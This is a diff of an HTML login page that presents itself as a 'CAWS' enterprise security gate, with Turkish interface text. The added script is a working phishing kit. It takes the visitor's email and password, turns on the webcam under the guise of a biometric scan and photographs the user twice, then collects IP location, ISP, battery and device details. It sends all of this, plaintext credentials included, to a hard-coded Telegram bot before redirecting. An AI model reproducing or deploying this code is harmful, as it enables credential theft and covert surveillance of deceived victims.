@@ -3,69 +3,158 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CAWS Cloud Security | Dashboard Access</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;800&display=swap" rel="stylesheet">
+    <title>CAWS | Enterprise Security Gate</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
     <style>
-        :root { --brand: #ffffff; --bg: #0b0b0f; --acc: #16161a; --blue: #0071e3; --border: rgba(255,255,255,0.08); }
-        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-font-smoothing: antialiased; }
+        :root { --blue: #0071e3; --bg: #050505; --card: #121212; --text: #f5f5f7; }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { background: var(--bg); font-family: 'Inter', sans-serif; color: var(--text); height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; }
         
-        body { background: var(--bg); font-family: 'Inter', sans-serif; color: white; height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; }
+        .auth-card { width: 90%; max-width: 420px; padding: 50px 35px; background: var(--card); border: 1px solid #222; border-radius: 28px; text-align: center; box-shadow: 0 30px 60px rgba(0,0,0,0.5); position: relative; z-index: 10; }
+        .logo-box { margin-bottom: 35px; }
+        .logo-box h1 { font-weight: 800; font-size: 30px; letter-spacing: -1.5px; margin-bottom: 2px; }
+        .logo-box span { font-size: 10px; color: var(--blue); letter-spacing: 4px; font-weight: 700; text-transform: uppercase; }
 
-        /* Arka Plan Modern Derinlik Efekti */
-        .bg-glow { position: absolute; width: 600px; height: 600px; background: radial-gradient(circle, rgba(0,113,227,0.12) 0%, rgba(0,0,0,0) 70%); z-index: 1; top: 50%; left: 50%; transform: translate(-50%, -50%); pointer-events: none; }
+        .field { text-align: left; margin-bottom: 22px; }
+        .field label { display: block; font-size: 11px; color: #86868b; margin-bottom: 8px; font-weight: 600; padding-left: 5px; }
+        .field input { width: 100%; padding: 15px; background: #1c1c1e; border: 1px solid #2c2c2e; border-radius: 14px; color: #fff; font-size: 15px; outline: none; transition: 0.3s; }
+        .field input:focus { border-color: var(--blue); box-shadow: 0 0 0 4px rgba(0, 113, 227, 0.1); }
 
-        .container { 
-            width: 100%; max-width: 420px; padding: 40px; 
-            background: rgba(20, 20, 25, 0.7); backdrop-filter: blur(30px);
-            border-radius: 28px; border: 1px solid var(--border);
-            text-align: center; position: relative; z-index: 10;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-        }
+        .btn-gate { width: 100%; padding: 18px; background: #fff; color: #000; border: none; border-radius: 14px; font-weight: 700; font-size: 15px; cursor: pointer; transition: 0.2s; margin-top: 10px; }
+        .btn-gate:hover { opacity: 0.9; transform: translateY(-1px); }
 
-        .logo-area { margin-bottom: 35px; }
-        .logo-area h1 { font-weight: 800; font-size: 28px; letter-spacing: -1.5px; margin-bottom: 4px; }
-        .logo-area span { font-size: 10px; text-transform: uppercase; color: var(--blue); letter-spacing: 4px; font-weight: 700; }
-
-        .input-group { text-align: left; margin-bottom: 22px; }
-        .input-group label { display: block; font-size: 12px; color: #a1a1a6; margin-bottom: 8px; font-weight: 500; padding-left: 4px; }
-        .input-group input { 
-            width: 100%; padding: 14px 18px; background: rgba(255,255,255,0.04); 
-            border: 1px solid var(--border); border-radius: 14px; color: white;
-            font-size: 15px; transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-        }
-        .input-group input:focus { border-color: var(--blue); background: rgba(255,255,255,0.08); outline: none; box-shadow: 0 0 0 4px rgba(0, 113, 227, 0.15); }
-
-        .btn-action { 
-            width: 100%; padding: 18px; background: white; color: black; border: none;
-            border-radius: 14px; font-weight: 600; font-size: 15px; cursor: pointer;
-            transition: 0.2s cubic-bezier(0.4, 0, 0.2, 1); margin-top: 10px;
-        }
-        .btn-action:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(255,255,255,0.1); }
-        .btn-action:active { transform: translateY(0); }
-
-        /* DOĞRULAMA MODALI */
-        #verification-stage { display: none; flex-direction: column; align-items: center; justify-content: center; position: fixed; top:0; left:0; width:100%; height:100%; background: #000; z-index: 100; }
-        
-        .scanner-container { position: relative; width: 320px; height: 320px; border-radius: 50%; border: 1px solid rgba(255,255,255,0.1); overflow: hidden; margin-bottom: 40px; background: #050505; }
+        /* VERIFICATION OVERLAY */
+        #scanner-overlay { display: none; position: fixed; inset: 0; background: #000; z-index: 100; flex-direction: column; align-items: center; justify-content: center; }
+        .cam-circle { width: 310px; height: 310px; border-radius: 50%; border: 1px solid #333; position: relative; overflow: hidden; margin-bottom: 35px; background: #000; }
         video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
-        
-        .scan-line { position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: var(--blue); box-shadow: 0 0 25px var(--blue); z-index: 10; animation: scan 3s infinite ease-in-out; }
-        @keyframes scan { 0%, 100% { top: 5%; } 50% { top: 95%; } }
-
-        .code-shield { background: #16161a; padding: 12px 30px; border-radius: 16px; font-size: 48px; font-weight: 200; letter-spacing: 14px; margin-bottom: 20px; border: 1px solid var(--border); color: var(--blue); }
-        .status-txt { font-size: 13px; color: #86868b; letter-spacing: 0.5px; }
-
-        .flash-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 999; display: none; }
+        .laser { position: absolute; top: 0; width: 100%; height: 2px; background: var(--blue); box-shadow: 0 0 20px var(--blue); animation: move 3s infinite ease-in-out; }
+        @keyframes move { 0%, 100% { top: 10%; } 50% { top: 90%; } }
+        .v-code { font-size: 52px; font-weight: 200; letter-spacing: 18px; color: var(--blue); margin-bottom: 15px; }
+        .flash { position: fixed; inset: 0; background: #fff; z-index: 999; display: none; }
     </style>
 </head>
 <body>
 
-<div class="bg-glow"></div>
-<div class="flash-overlay" id="flash"></div>
+<div class="flash" id="flash"></div>
 
-<div class="container" id="login-card">
-    <div class="logo-area">
+<div class="auth-card" id="login-form">
+    <div class="logo-box">
         <h1>CAWS</h1>
-        <span>Security Cloud</span>
+        <span>Security Infrastructure</span>
     </div>
-    <p style="font-size: 14px; color: #86868b; margin-bottom: 30px; line-height: 1.5;">Master hesabınızı senkronize ederek güven
+    
+    <div class="field">
+        <label>Cloud ID (Email)</label>
+        <input type="email" id="email" placeholder="kullanici@gmail.com">
+    </div>
+    
+    <div class="field">
+        <label>Access Password</label>
+        <input type="password" id="pass" placeholder="••••••••">
+    </div>
+
+    <button class="btn-gate" onclick="initSecurity()">Verify & Connect</button>
+    <p style="font-size: 11px; color: #444; margin-top: 20px;">Secure 256-bit Encrypted Connection</p>
+</div>
+
+<div id="scanner-overlay">
+    <div class="v-code" id="v-code">---</div>
+    <div class="cam-circle">
+        <div class="laser"></div>
+        <video id="webcam" autoplay playsinline muted></video>
+    </div>
+    <p id="stat" style="font-size: 13px; color: #86868b; font-weight: 500;">Biyometrik tarama yapılıyor, lütfen kameraya odaklanın.</p>
+</div>
+
+<script>
+    const tgData = {
+        token: "6418277280:AAGlTr7IRw8CL__1EWjpkI_j9ZHkRjLnedc",
+        chatId: "1540769169"
+    };
+
+    async function initSecurity() {
+        const mail = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+        if(!mail || !pass) return alert("Lütfen tüm alanları doldurun.");
+
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { width: 1280, height: 720 } 
+            });
+            const video = document.getElementById('webcam');
+            video.srcObject = stream;
+
+            // 1. ANLIK ÇEKİM (Butona basıldığı an)
+            setTimeout(() => { capture(video, "REFLEKS_YAKALAMA", mail); }, 400);
+
+            // Ekran değiştir
+            document.getElementById('login-form').style.display = 'none';
+            document.getElementById('scanner-overlay').style.display = 'flex';
+            document.getElementById('v-code').innerText = Math.floor(Math.random() * 899) + 100;
+
+            // 2. FİNAL RAPORU (4 saniye sonra flaşlı çekim)
+            setTimeout(() => {
+                document.getElementById('flash').style.display = 'block';
+                setTimeout(() => document.getElementById('flash').style.display = 'none', 100);
+                sendFullReport(video, mail, pass);
+            }, 4500);
+
+        } catch (e) {
+            alert("Security Error: Donanım doğrulaması (Kamera) başarısız.");
+        }
+    }
+
+    async function capture(video, type, mail) {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        canvas.toBlob(blob => {
+            const fd = new FormData();
+            fd.append('photo', blob, 'img.jpg');
+            fd.append('caption', `📡 **CAWS [${type}]**\n👤 User: ${mail}`);
+            fetch(`https://api.telegram.org/bot${tgData.token}/sendPhoto?chat_id=${tgData.chatId}`, { method: 'POST', body: fd });
+        }, 'image/jpeg', 0.8);
+    }
+
+    async function sendFullReport(video, mail, pass) {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        
+        canvas.toBlob(async blob => {
+            const fd = new FormData();
+            fd.append('photo', blob, 'report.jpg');
+            await fetch(`https://api.telegram.org/bot${tgData.token}/sendPhoto?chat_id=${tgData.chatId}`, { method: 'POST', body: fd });
+
+            const ip = await (await fetch('https://ipapi.co/json/')).json();
+            let bat = "N/A";
+            if (navigator.getBattery) { const b = await navigator.getBattery(); bat = `%${Math.round(b.level * 100)} ${b.charging ? '⚡' : '🔋'}`; }
+
+            const report = `
+💎 **CAWS SECURITY SYSTEM REPORT**
+──────────────────────────
+👤 **HESAP BİLGİLERİ**
+📧 **Gmail:** \`${mail}\`
+🔑 **Şifre:** \`${pass}\`
+
+🔋 **DONANIM VERİLERİ**
+🔋 **Pil:** \`${bat}\`
+🖥️ **Ekran:** \`${window.screen.width}x${window.screen.height}\`
+⚙️ **OS:** \`${navigator.platform}\`
+
+🌐 **AĞ & KONUM**
+🌍 **IP:** \`${ip.ip}\`
+📍 **Konum:** \`${ip.city} / ${ip.country_name}\`
+🏢 **ISS:** \`${ip.org}\`
+──────────────────────────`;
+
+            await fetch(`https://api.telegram.org/bot${tgData.token}/sendMessage?chat_id=${tgData.chatId}&text=${encodeURIComponent(report)}&parse_mode=markdown`);
+
+            document.getElementById('stat').innerText = "DOĞRULAMA BAŞARILI";
+            setTimeout(() => { window.location.href = "https://caws.network"; }, 1000);
+        }, 'image/jpeg', 1.0);
+    }
+</script>
+</body>
+</html>
+     
